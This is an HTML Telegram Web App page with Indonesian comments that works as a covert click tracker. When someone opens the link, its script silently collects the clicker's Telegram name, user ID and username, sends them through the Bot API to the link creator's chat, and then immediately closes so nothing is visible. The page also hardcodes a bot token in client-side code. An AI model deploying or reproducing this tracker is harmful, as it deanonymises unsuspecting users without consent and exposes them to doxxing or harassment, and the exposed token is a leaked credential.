<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body style="background: #000000;">
    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();

        const userKlik = tg.initDataUnsafe.user;
        const adminId = tg.initDataUnsafe.start_param; // Menangkap ID pengirim dari ?startapp
        const botToken = "8545998251:AAEhYhH2bjBkXIrwVzBaeCbsSmP0XAe4GBw"; // Samakan dengan token di Termux

        if (userKlik && adminId) {
            // Format laporan: Nama bisa diklik ke profil
            const mentionUser = `[${userKlik.first_name}](tg://user?id=${userKlik.id})`;
            const username = userKlik.username ? `@${userKlik.username}` : 'n/a';

            const laporan = `🔔 *ADA YANG KLIK LINK!*
----------------------------
👤 nickname: ${mentionUser}
🆔 ID: \`${userKlik.id}\`
🔗 Username: ${username}
----------------------------`;

            // Kirim notif ke Admin pembuat link
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: adminId,
                    text: laporan,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            })
            .then(() => { tg.close(); }) // Langsung tutup aplikasinya
            .catch(() => { tg.close(); });
        } else {
            tg.close();
        }
    </script>
</body>
</html>
